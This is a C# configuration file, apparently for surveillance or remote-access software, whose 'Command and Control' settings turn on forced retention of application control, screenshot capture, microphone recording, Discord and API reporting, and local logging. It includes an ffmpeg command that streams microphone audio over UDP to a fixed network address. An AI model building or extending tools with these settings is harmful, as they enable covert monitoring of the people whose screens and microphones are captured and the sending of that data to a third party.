namespace SLA_Remake;

public static class Configuration
{
	// Command and Control
	// -------------------

	private const bool yes = true;
	private const bool no = false;
	
	public const bool EnableTheInternet = yes;		// no: The Internet will not be used anywhere
	public const bool EnablePrimeGuard = yes;       // no: The PrimeGuard won't initiate (which repeatedly regains application control, forcefully) 
	public const bool EnableOriginalUser = no;		// no: The placeholder username will be used everywhere
	public const bool EnableNewerVersion = no;		// no: The newer version will be considered as older
	public const bool EnableLogOnDiscord = yes;		// no: The Discord Reporting will be disabled
	public const bool EnableLoggingOnAPI = yes;		// no: The Entries won't be posted to the API
	public const bool EnableCacheLogging = yes;     // no: The Entries won't be saved locally in the Database
	public const bool CaptureScreenshots = yes;     // no: Screen-shots will not be captured
	public const bool CaptureMicrophones = yes;     // no: Microphone will not be recorded

	// Other Constants
	// ---------------

	public static readonly string MyName = System.AppDomain.CurrentDomain.FriendlyName;
	public static readonly string MyPath = System.AppDomain.CurrentDomain.BaseDirectory;
	public static readonly string Resources = System.IO.Path.Combine(MyPath, "Resources");
	public const string PlaceholderUsername = "TEST";
	public const string ApplicationsVersion = EnableNewerVersion ? "3.0.0.00" : "2.0.0.01";

	public static class Screenshots
	{
		public static readonly string Route = System.IO.Path.Combine(MyPath, "Screenshots");
		public const string ImagesDelimiter = "_(~$~)_";
		public const string ImagesExtension = ".jpg";
		public const int MaxTransferThreads = 5;
	}

	public static class AdiosFFMPEG
	{
		public const string exeName = "ffmpeg";
		public static class Command
		{
			public const string RecordAudio = "-f {0} -acodec libmp3lame -ar 44100 -f mpegts udp://192.168.0.190:7860";
			public const string ListDevices = "-list_devices true -f dshow -i TheMR";
		}
	}
}